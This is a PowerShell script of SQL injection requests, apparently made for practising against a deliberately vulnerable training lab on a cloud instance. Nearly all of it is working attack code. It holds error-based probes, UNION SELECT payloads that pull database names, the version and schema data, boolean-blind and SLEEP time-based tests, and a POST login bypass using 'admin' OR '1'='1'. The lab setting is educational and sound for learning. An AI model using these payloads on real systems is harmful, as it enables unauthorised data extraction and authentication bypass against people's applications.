# PowerShell SQLi Testing Examples
#
# Replace $ip with your GCP instance external IP.

$ip = "34.59.129.231"

# Visit /show-queries.php to see the SQL queries being executed.
# Visit /show-queries.php?clear=1 to clear the query log.

# function that replaces multiple newlines with a single newline
function Replace-MultipleNewlines {
    param (
        [string]$inputString
    )

    # Replace 2 or more consecutive newlines with a single newline
    $inputString = $inputString -replace '(\r?\n){2,}', "`n"

    $inputString
}


function Remove-Boring-HTMLTags {
    param (
        [string]$inputString
    )

    # replace <DOCTYPE, <html, <head
    $inputString = $inputString -replace '<!DOCTYPE[^>]+>', ' '
    $inputString = $inputString -replace '<html[^>]+>', ' '
    $inputString = $inputString -replace '<head[^>]+>', ' '
    # meta  
    $inputString = $inputString -replace '<meta[^>]+>', ' '

    # and their closing tags
    $inputString = $inputString -replace '</html>', ' '
    $inputString = $inputString -replace '</head>', ' '
    $inputString = $inputString -replace '</body>', ' '
    $inputString = $inputString -replace '</title>', ' '

    $inputString
}

# Trim and replace multiple newlines with a single newline
function Better-Trim {
    param (
        [string]$inputString
    )

    # Remove HTML tags
    $inputString = Remove-Boring-HTMLTags $inputString
    
    # trim whitespace
    $inputString = $inputString.Trim()
    
    # Replace 2 or more consecutive newlines with a single newline
    $inputString = Replace-MultipleNewlines ($inputString)

    $inputString.Trim()
}

# ============================================================================
# Less-1: Error-Based String Injection
# ============================================================================

# Normal Request
$payload="1"
Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pattern 'password'
# Raw SQL from /show-queries.php
# SELECT * FROM users WHERE id='1' LIMIT 0,1
# This SQL output is actually really useful - it shows us exactly where our '1' is being inserted into.


# Simple vulnerability test...
# Single quote causes SQL error
$payload="1'"
Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pattern 'error'
# Raw SQL from /show-queries.php
# SELECT * FROM users WHERE id='1'' LIMIT 0,1
# Still useful! We can see the extra single quote

# Confirm with comment
$payload="1'--"
Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pattern 'error'
# Raw SQL from /show-queries.php
# SELECT * FROM users WHERE id='1'--' LIMIT 0,1

# Extract data or test if we can successfully run a SQL command
$payload="1' OR '1'='1"
Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pattern 'password'
# Raw SQL from /show-queries.php
# SELECT * FROM users WHERE id='1' OR '1'='1' LIMIT 0,1


# UNION-based injection to extract database names
# First, find the number of columns (this query has 3: id, username, password)
# Note: # must be URL-encoded as %23 in PowerShell (otherwise treated as URL fragment)
# Use -1 or 999 to make first query return no rows, so UNION result shows
$payload="-1' UNION SELECT 1,2,3%23"
Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content)
# Raw SQL: SELECT * FROM users WHERE id='-1' UNION SELECT 1,2,3#' LIMIT 0,1
# Should show: Your Login name:2  Your Password:3

# Extract first schema name from information_schema
$payload="-1' UNION SELECT 1,schema_name,3 FROM information_schema.schemata LIMIT 1%23"
Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pattern 'password|Login'
# Raw SQL: SELECT * FROM users WHERE id='-1' UNION SELECT 1,schema_name,3 FROM information_schema.schemata LIMIT 1#' LIMIT 0,1

# Extract current database name
$payload="-1' UNION SELECT 1,database(),3%23"
Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pattern 'password|Login'
# Raw SQL: SELECT * FROM users WHERE id='-1' UNION SELECT 1,database(),3#' LIMIT 0,1
# Should show: Your Login name:security

# Extract MySQL version
$payload="-1' UNION SELECT 1,@@version,3%23"
Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pattern 'password|Login'
# Raw SQL: SELECT * FROM users WHERE id='-1' UNION SELECT 1,@@version,3#' LIMIT 0,1


# ============================================================================
# Less-2: Error-Based Numeric Injection
# ============================================================================

# Normal Request
(iwr "http://$ip/Less-2/?id=1").Content.Trim()

# Test for Vulnerability

# Boolean-based
iwr "http://$ip/Less-2/?id=1 AND 1=1"
iwr "http://$ip/Less-2/?id=1 AND 1=2"

# Extract all rows
iwr "http://$ip/Less-2/?id=1 OR 1=1"

# ============================================================================
# Less-3: String with Twist (')
# ============================================================================

# Test for Vulnerability
iwr "http://$ip/Less-3/?id=1'"
iwr "http://$ip/Less-3/?id=1') OR ('1'='1"

# ============================================================================
# Less-4: Double Quotes
# ============================================================================

# Test for Vulnerability
iwr "http://$ip/Less-4/?id=1`""
iwr "http://$ip/Less-4/?id=1`") OR (`"1`"=`"1"

# ============================================================================
# Less-8: Blind Boolean-Based
# ============================================================================

# Test for Vulnerability

# True condition (page loads normally)
iwr "http://$ip/Less-8/?id=1' AND '1'='1"

# False condition (different response)
iwr "http://$ip/Less-8/?id=1' AND '1'='2"

# ============================================================================
# POST-Based Example (Less-11)
# ============================================================================

# Normal login
$body = @{
    uname = "admin"
    passwd = "password"
}
iwr "http://$ip/Less-11/" -Method POST -Body $body

# SQL Injection
$body = @{
    uname = "admin' OR '1'='1"
    passwd = "anything"
}
iwr "http://$ip/Less-11/" -Method POST -Body $body

# ============================================================================
# Useful PowerShell Tips
# ============================================================================

# View Response Content
$response = iwr "http://$ip/Less-1/?id=1"
$response.Content

# View Status Code
$response.StatusCode

# Measure Response Time (Blind Time-Based)
Measure-Command { iwr "http://$ip/Less-9/?id=1' AND SLEEP(5)--" }

# Save Response to File
iwr "http://$ip/Less-1/?id=1" -OutFile response.html

# ============================================================================
# URL Encoding in PowerShell
# ============================================================================

# PowerShell handles most encoding automatically, but for special chars:
[System.Web.HttpUtility]::UrlEncode("1' OR '1'='1")

# Or use backtick for escaping in double quotes
iwr "http://$ip/Less-1/?id=1`' OR `'1`'=`'1"
